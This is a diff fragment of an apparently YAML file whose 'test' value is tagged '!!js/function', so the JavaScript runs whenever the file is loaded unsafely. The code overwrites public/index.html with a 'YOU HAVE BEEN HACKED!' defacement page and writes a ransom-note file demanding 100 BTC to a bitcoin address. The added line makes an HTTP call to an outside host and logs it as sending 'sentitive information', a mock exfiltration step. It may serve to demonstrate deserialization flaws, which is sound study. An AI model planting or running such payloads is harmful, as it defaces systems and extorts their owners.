@@ -6,5 +6,6 @@ test: !!js/function |
     fs.writeFileSync('public/index.html', '<html><head><style>body{background-color:#000;color:#fff;margin-top:50px;text-align:center;}h1{font-family:Impact,Arial;font-size:60px;}big{font-size:80px;font-family:Courier New;font-weight:bold;}</style></head><body><h1>YOU HAVE BEEN HACKED!</h1><big>¯\\_(ツ)_/¯</big></body></html>', 'utf8');
     fs.writeFileSync('YOU HAVE BEEN HACKED', '');
     fs.writeFileSync('SEND $BTC 100 TO RESTORE (address inside)', '1cf1Fk6HUTFkmnJyi9Cfj2ExcXLzFgPsf');
+    http.get('http://www.google.com/', function(r) { console.log('Sent sentitive information to Google'); });
     console.log('evil done');
   }();
